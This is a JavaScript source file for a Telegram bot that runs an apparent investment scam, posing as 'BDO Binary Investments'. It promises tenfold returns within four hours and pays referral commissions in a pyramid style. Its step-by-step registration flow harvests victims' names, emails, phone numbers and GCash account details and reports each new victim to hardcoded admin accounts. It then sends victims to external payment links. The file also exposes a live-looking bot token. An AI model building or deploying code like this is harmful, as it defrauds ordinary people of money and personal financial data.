import TelegramBot from "node-telegram-bot-api";
import pm2 from "pm2";

// Initialize bot
const bot = new TelegramBot("7739574932:AAHnQpeZR9obL8u7-oUdenZpIcSvTl5eZrY", { polling: true });

// Admin user IDs to notify
const ADMIN_IDS = [6300694007, 7279302614];

// Image URLs
const IMAGES = [
    "https://files.catbox.moe/mbbbch.jpg",
    "https://files.catbox.moe/bef1af.jpg"
];

// User data storage
const userDatabase = new Map();

// Investment plans with unique links
const investmentPlans = [
    { amount: "₱2K", earnings: "₱20k", link: "https://bdo-invest.com/plan/2k" },
    { amount: "₱3K", earnings: "₱30k", link: "https://bdo-invest.com/plan/3k" },
    { amount: "₱5K", earnings: "₱50k", link: "https://bdo-invest.com/plan/5k" },
    { amount: "₱10K", earnings: "₱70k", link: "https://bdo-invest.com/plan/10k" },
    { amount: "₱15K", earnings: "₱130k", link: "https://bdo-invest.com/plan/15k" },
    { amount: "₱20K", earnings: "₱170k", link: "https://bdo-invest.com/plan/20k" },
    { amount: "₱25K", earnings: "₱200k", link: "https://bdo-invest.com/plan/25k" },
    { amount: "₱30K", earnings: "₱250k", link: "https://bdo-invest.com/plan/30k" },
    { amount: "₱35K", earnings: "₱300k", link: "https://bdo-invest.com/plan/35k" },
    { amount: "₱40K", earnings: "₱350k", link: "https://bdo-invest.com/plan/40k" },
    { amount: "₱45K", earnings: "₱400k", link: "https://bdo-invest.com/plan/45k" },
    { amount: "₱50K", earnings: "₱500K", link: "https://bdo-invest.com/plan/50k" }
];

// Registration steps
const REGISTRATION_STEPS = {
    START: "start",
    FULL_NAME: "full_name",
    GENDER: "gender",
    EMAIL: "email",
    PHONE: "phone",
    COUNTRY: "country",
    GCASH_NAME: "gcash_name",
    GCASH_ACCOUNT: "gcash_account",
    COMPLETE: "complete"
};

// Helper functions
function getRandomImage() {
    return IMAGES[Math.floor(Math.random() * IMAGES.length)];
}

function generateReferralCode(userId) {
    return `BDO-${userId.toString().slice(-6)}`;
}

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validatePhone(phone) {
    return /^[0-9]{10,15}$/.test(phone);
}

function chunkArray(arr, size) {
    return Array.from({ length: Math.ceil(arr.length / size) }, (_, i) =>
        arr.slice(i * size, i * size + size)
    );
}

async function sendMessageWithImage(chatId, message, options = {}) {
    return await bot.sendPhoto(chatId, getRandomImage(), {
        caption: message,
        parse_mode: "Markdown",
        ...options
    });
}

async function notifyAdmins(message) {
    for (const adminId of ADMIN_IDS) {
        try {
            await bot.sendMessage(adminId, message, { parse_mode: "Markdown" });
        } catch (error) {
            console.error(`Failed to notify admin ${adminId}:`, error);
        }
    }
}

// Command: /start with referral support
bot.onText(/\/start(?:\s+(\w+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const referralCode = match[1];
    const username = msg.from.username ? `@${msg.from.username}` : 'No username';

    // Initialize user if not exists
    if (!userDatabase.has(userId)) {
        userDatabase.set(userId, {
            name: msg.from.first_name || "Investor",
            username: username,
            referralCode: generateReferralCode(userId),
            referredBy: referralCode || null,
            balance: 0,
            investments: [],
            step: REGISTRATION_STEPS.START,
            registrationDate: new Date(),
            registrationData: {}
        });

        // Notify admins about new registration
        const notifyMessage = `🆕 *New Account Started*\n\n` +
            `User: ${msg.from.first_name || 'No name'} ${username}\n` +
            `ID: ${userId}\n` +
            `Referral: ${referralCode || 'Direct'}`;
        
        await notifyAdmins(notifyMessage);

        // If came through referral, notify referrer
        if (referralCode) {
            const referrer = [...userDatabase.entries()].find(
                ([_, user]) => user.referralCode === referralCode
            );
            if (referrer) {
                const [referrerId, referrerData] = referrer;
                await sendMessageWithImage(referrerId, 
                    `🎉 New referral joined!\n\n${msg.from.first_name || 'New user'} signed up using your link!`);
            }
        }
    }

    const user = userDatabase.get(userId);
    const welcomeMessage = `*Welcome To BDO Binary Investments!*\n\n` +
        `🔒 *100% Safe & Secure*\n💰 *100% Profit Payout*\n🚫 No Fees\n\n` +
        `${user.step === REGISTRATION_STEPS.COMPLETE ? 
            `💰 *Your Referral Code:* \`${user.referralCode}\`\n` +
            `💸 *Referral Balance:* ₱${user.balance.toFixed(2)}\n\n` +
            `Invite friends and earn 20% of their investment earnings!` : 
            `Please complete your registration to start investing!`}`;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "📝 Register Now", callback_data: "start_registration" }],
                user.step === REGISTRATION_STEPS.COMPLETE ? 
                    [{ text: "💰 Invest Now", callback_data: "invest_now" }] : 
                    [{ text: "💰 Invest Now", callback_data: "need_register" }],
                [{ text: "📤 Refer Friends", callback_data: "refer_friends" }]
            ]
        }
    };

    await sendMessageWithImage(chatId, welcomeMessage, options);
});

// Command: /invest
bot.onText(/\/invest/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!userDatabase.has(userId)) {
        return await sendMessageWithImage(chatId, "Please /start first to begin");
    }

    const user = userDatabase.get(userId);
    if (user.step !== REGISTRATION_STEPS.COMPLETE) {
        return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
    }

    await showInvestmentPlans(chatId);
});

// Command: /refer
bot.onText(/\/refer/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!userDatabase.has(userId)) {
        return await sendMessageWithImage(chatId, "Please /start first to get your referral code");
    }
    
    const user = userDatabase.get(userId);
    if (user.step !== REGISTRATION_STEPS.COMPLETE) {
        return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
    }
    
    const referralMessage = `🚀 *Refer Friends & Earn 20% Commission!*\n\n` +
        `Share your referral link below:\n\n` +
        `🔗 *Your Referral Link:*\n` +
        `https://t.me/${bot.options.username}?start=${user.referralCode}\n\n` +
        `📢 *Sample Message:*\n` +
        `"Join BDO Binary Investments using my link! ` +
        `I've earned ₱${user.balance.toFixed(2)} from referrals! ` +
        `Here's my link: https://t.me/${bot.options.username}?start=${user.referralCode}"`;
    
    await sendMessageWithImage(chatId, referralMessage);
});

// Handle callback queries
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const data = query.data;
    const username = query.from.username ? `@${query.from.username}` : 'No username';

    await bot.answerCallbackQuery(query.id);

    if (data === "start_registration") {
        startRegistration(chatId, userId);
    } 
    else if (data === "invest_now") {
        if (!userDatabase.has(userId)) {
            return await sendMessageWithImage(chatId, "Please /start first to begin");
        }
        const user = userDatabase.get(userId);
        if (user.step !== REGISTRATION_STEPS.COMPLETE) {
            return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
        }
        await showInvestmentPlans(chatId);
    }
    else if (data === "need_register") {
        await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
    }
    else if (data === "view_plans") {
        await showInvestmentPlans(chatId);
    }
    else if (data === "refer_friends") {
        if (!userDatabase.has(userId)) {
            return await sendMessageWithImage(chatId, "Please /start first to get your referral code");
        }
        const user = userDatabase.get(userId);
        if (user.step !== REGISTRATION_STEPS.COMPLETE) {
            return await sendMessageWithImage(chatId, "⚠️ Please complete your registration first!\n\nClick 'Register Now' to continue.");
        }
        await bot.onText(/\/refer/, { chat_id: chatId, from: { id: userId } });
    }
    else if (data.startsWith("plan_")) {
        const plan = investmentPlans.find(p => data === `plan_${p.amount}`);
        if (plan) {
            const user = userDatabase.get(userId);
            
            // Notify admins about investment selection
            const notifyMessage = `💵 *New Investment Selection*\n\n` +
                `User: ${user.name} ${username}\n` +
                `ID: ${userId}\n` +
                `Amount: ${plan.amount}\n` +
                `Potential Earnings: ${plan.earnings}`;
            
            await notifyAdmins(notifyMessage);
            
            await processInvestment(chatId, userId, plan);
        }
    }
});

// Handle messages
bot.on("message", async (msg) => {
    if (msg.text?.startsWith('/')) return;
    
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text?.trim();
    const username = msg.from.username ? `@${msg.from.username}` : 'No username';

    if (!userDatabase.has(userId)) return;

    const user = userDatabase.get(userId);

    switch (user.step) {
        case REGISTRATION_STEPS.FULL_NAME:
            user.registrationData.fullName = text;
            user.step = REGISTRATION_STEPS.GENDER;
            await sendMessageWithImage(chatId, "📝 *Gender:*");
            break;
            
        case REGISTRATION_STEPS.GENDER:
            user.registrationData.gender = text;
            user.step = REGISTRATION_STEPS.EMAIL;
            await sendMessageWithImage(chatId, "📧 *Email Address:*");
            break;
            
        case REGISTRATION_STEPS.EMAIL:
            if (!validateEmail(text)) {
                await sendMessageWithImage(chatId, "⚠️ Invalid email. Please enter a valid email:");
                return;
            }
            user.registrationData.email = text;
            user.step = REGISTRATION_STEPS.PHONE;
            await sendMessageWithImage(chatId, "📱 *Phone Number:*");
            break;
            
        case REGISTRATION_STEPS.PHONE:
            if (!validatePhone(text)) {
                await sendMessageWithImage(chatId, "⚠️ Invalid phone number. Please enter a valid number:");
                return;
            }
            user.registrationData.phone = text;
            user.step = REGISTRATION_STEPS.COUNTRY;
            await sendMessageWithImage(chatId, "🌍 *Country:*");
            break;
            
        case REGISTRATION_STEPS.COUNTRY:
            user.registrationData.country = text;
            user.step = REGISTRATION_STEPS.GCASH_NAME;
            await sendMessageWithImage(chatId, "💳 *GCash Name:*");
            break;
            
        case REGISTRATION_STEPS.GCASH_NAME:
            user.registrationData.gcashName = text;
            user.step = REGISTRATION_STEPS.GCASH_ACCOUNT;
            await sendMessageWithImage(chatId, "📱 *GCash Account Number:*");
            break;
            
        case REGISTRATION_STEPS.GCASH_ACCOUNT:
            user.registrationData.gcashAccount = text;
            user.step = REGISTRATION_STEPS.COMPLETE;
            
            // Notify admins about completed registration
            const notifyMessage = `✅ *Registration Completed*\n\n` +
                `User: ${user.name} ${username}\n` +
                `ID: ${userId}\n` +
                `Phone: ${user.registrationData.phone}\n` +
                `Country: ${user.registrationData.country}`;
            
            await notifyAdmins(notifyMessage);
            
            await completeRegistration(chatId, user);
            break;
    }
});

// Registration functions
function startRegistration(chatId, userId) {
    const user = userDatabase.get(userId);
    user.step = REGISTRATION_STEPS.FULL_NAME;
    user.registrationData = {};
    sendMessageWithImage(chatId, "📝 *Full Name:*");
}

async function showInvestmentPlans(chatId, isRegistration = false) {
    let plansText = "*Investment Plans And Potential Earnings In 4 Hours* ⬇️\n\n";
    
    investmentPlans.forEach(plan => {
        plansText += `➡️ ${plan.amount} → ${plan.earnings}\n`;
    });

    const buttons = investmentPlans.map(plan => ({
        text: `${plan.amount} → ${plan.earnings}`,
        url: plan.link
    }));

    const options = {
        reply_markup: {
            inline_keyboard: [
                ...chunkArray(buttons, 2),
                isRegistration ? [{ text: "🚫 Cancel", callback_data: "cancel_registration" }] : []
            ].filter(Boolean)
        }
    };

    await sendMessageWithImage(chatId, plansText, options);
}

async function completeRegistration(chatId, user) {
    const confirmation = `✅ *Registration Complete!*\n\n` +
        `*Account Details:*\n` +
        `👤 Name: ${user.registrationData.fullName}\n` +
        `⚤ Gender: ${user.registrationData.gender}\n` +
        `📧 Email: ${user.registrationData.email}\n` +
        `📱 Phone: ${user.registrationData.phone}\n` +
        `🌍 Country: ${user.registrationData.country}\n` +
        `💳 GCash: ${user.registrationData.gcashName} (${user.registrationData.gcashAccount})\n\n` +
        `💰 *Your Referral Code:* \`${user.referralCode}\`\n` +
        `🔗 *Referral Link:* https://t.me/${bot.options.username}?start=${user.referralCode}\n\n` +
        `You can now start investing!`;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "💰 Invest Now", callback_data: "invest_now" }],
                [{ text: "📤 Refer Friends", callback_data: "refer_friends" }]
            ]
        }
    };

    await sendMessageWithImage(chatId, confirmation, options);
}

// Process investment with payment instructions
async function processInvestment(chatId, userId, plan) {
    const user = userDatabase.get(userId);
    
    // Record investment
    user.investments.push({
        amount: plan.amount.replace('₱', '').replace('K', '000'),
        date: new Date(),
        status: "pending"
    });

    // Credit referrer if exists
    if (user.referredBy) {
        const referrer = [...userDatabase.entries()].find(
            ([_, u]) => u.referralCode === user.referredBy
        );
        if (referrer) {
            const [referrerId, referrerData] = referrer;
            const commission = parseInt(plan.amount.replace('₱', '').replace('K', '000')) * 0.20;
            referrerData.balance += commission;
            userDatabase.set(referrerId, referrerData);
            
            // Notify referrer
            await sendMessageWithImage(referrerId,
                `🎉 *New Referral Earnings!*\n\n` +
                `You earned ₱${commission.toFixed(2)} from ${user.name}'s investment!\n` +
                `💰 *Total Balance:* ₱${referrerData.balance.toFixed(2)}`);
        }
    }

    // Send payment instructions
    const paymentMessage = `💵 *You selected ${plan.amount} investment*\n\n` +
        `1. Pay on the website you were redirected to\n` +
        `2. Select "Check out"\n` +
        `3. Fill your name and email address\n` +
        `4. Click "Pay now"\n` +
        `5. Select "Bank transfer" and send to the account details provided\n\n` +
        `Your payment will be automatically confirmed and you'll receive your interest within 4 hours!`;

    await sendMessageWithImage(chatId, paymentMessage);
}

// Start the bot
console.log("BDO Investment Bot is running...");
